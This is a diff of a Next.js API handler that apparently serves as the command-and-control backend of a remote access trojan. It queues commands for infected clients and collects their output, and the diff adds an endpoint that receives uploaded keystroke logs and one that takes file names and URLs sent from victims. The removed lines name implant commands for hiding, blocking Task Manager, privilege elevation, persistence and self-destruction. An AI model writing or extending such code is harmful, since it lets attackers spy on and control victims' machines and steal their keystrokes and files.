@@ -1,5 +1,4 @@
 import { NextApiRequest, NextApiResponse } from 'next'
-import { IncomingForm } from 'formidable'
 
 interface Command {
   id: string
@@ -16,26 +15,6 @@ interface CommandResult {
 
 const commandQueue = new Map<string, Command[]>()
 const commandResults = new Map<string, CommandResult[]>()
-
-export const config = {
-  api: {
-    bodyParser: false,
-  },
-}
-
-const parseBody = async (req: NextApiRequest): Promise<any> => {
-  return new Promise((resolve) => {
-    let data = ''
-    req.on('data', (chunk) => { data += chunk })
-    req.on('end', () => {
-      try {
-        resolve(JSON.parse(data))
-      } catch {
-        resolve({})
-      }
-    })
-  })
-}
 
 export default async function handler(req: NextApiRequest, res: NextApiResponse) {
   const { action, clientId } = req.query
@@ -65,16 +44,8 @@ export default async function handler(req: NextApiRequest, res: NextApiResponse)
         break
       }
       
-      const body = await parseBody(req)
-      const { command, type } = body
-      
-      if (!type) {
-        res.status(400).json({ status: 'error', message: '缺少命令类型' })
-        break
-      }
-      
-      const noContentTypes = ['processes', 'drives', 'startup', 'hide', 'block_taskmgr', 'selfdestruct', 'elevate']
-      if (!command && !noContentTypes.includes(type)) {
+      const { command, type } = req.body
+      if (!command) {
         res.status(400).json({ status: 'error', message: '缺少命令内容' })
         break
       }
@@ -101,9 +72,7 @@ export default async function handler(req: NextApiRequest, res: NextApiResponse)
         break
       }
       
-      const body = await parseBody(req)
-      const { commandId, output } = body
-      
+      const { commandId, output } = req.body
       if (!commandId) {
         res.status(400).json({ status: 'error', message: '缺少命令ID' })
         break
@@ -130,14 +99,58 @@ export default async function handler(req: NextApiRequest, res: NextApiResponse)
         break
       }
       
-      const results = commandResults.get(cId) || []
-      if (results.length > 0) {
-        const result = results.shift()
-        commandResults.set(cId, results)
-        res.status(200).json({ status: 'success', result: result?.output || '' })
+      const { commandId } = req.query
+      
+      if (commandId) {
+        const results = commandResults.get(cId) || []
+        const result = results.find(r => r.commandId === commandId)
+        if (result) {
+          res.status(200).json({ status: 'success', result })
+        } else {
+          res.status(200).json({ status: 'success', result: null })
+        }
       } else {
-        res.status(200).json({ status: 'success', result: '' })
+        const results = commandResults.get(cId) || []
+        if (results.length > 0) {
+          const latestResult = results[results.length - 1]
+          res.status(200).json({ status: 'success', result: latestResult })
+        } else {
+          res.status(200).json({ status: 'success', result: null })
+        }
       }
+      break
+    }
+
+    case 'clearResults': {
+      if (!cId) {
+        res.status(400).json({ status: 'error', message: '缺少客户端ID' })
+        break
+      }
+      
+      commandResults.delete(cId)
+      res.status(200).json({ status: 'success', message: '结果已清空' })
+      break
+    }
+
+    case 'uploadKeylog': {
+      if (!cId) {
+        res.status(400).json({ status: 'error', message: '缺少客户端ID' })
+        break
+      }
+      
+      const { logs } = req.body
+      if (!commandResults.has(cId)) {
+        commandResults.set(cId, [])
+      }
+      
+      const result: CommandResult = {
+        commandId: `keylog_${Date.now()}`,
+        output: logs,
+        timestamp: Date.now()
+      }
+      
+      commandResults.get(cId)?.push(result)
+      res.status(200).json({ status: 'success', message: '键盘记录已上传' })
       break
     }
 
@@ -147,30 +160,24 @@ export default async function handler(req: NextApiRequest, res: NextApiResponse)
         break
       }
       
-      const form = new IncomingForm({
-        maxFileSize: 50 * 1024 * 1024,
-      })
+      const { fileName, fileUrl } = req.body
+      if (!fileName || !fileUrl) {
+        res.status(400).json({ status: 'error', message: '缺少文件名或URL' })
+        break
+      }
       
-      form.parse(req, (err, fields, files) => {
-        if (err) {
-          res.status(500).json({ status: 'error', message: '文件解析失败' })
-          return
-        }
-        
-        const file = files?.file as any
-        if (!file) {
-          res.status(400).json({ status: 'error', message: '缺少文件' })
-          return
-        }
-        
-        const filename = Array.isArray(file) ? file[0]?.originalFilename : file?.originalFilename
-        
-        res.status(200).json({ 
-          status: 'success', 
-          message: '文件上传成功',
-          filename
-        })
-      })
+      if (!commandResults.has(cId)) {
+        commandResults.set(cId, [])
+      }
+      
+      const result: CommandResult = {
+        commandId: `file_${Date.now()}`,
+        output: JSON.stringify({ fileName, fileUrl }),
+        timestamp: Date.now()
+      }
+      
+      commandResults.get(cId)?.push(result)
+      res.status(200).json({ status: 'success', message: '文件信息已上传' })
       break
     }
 
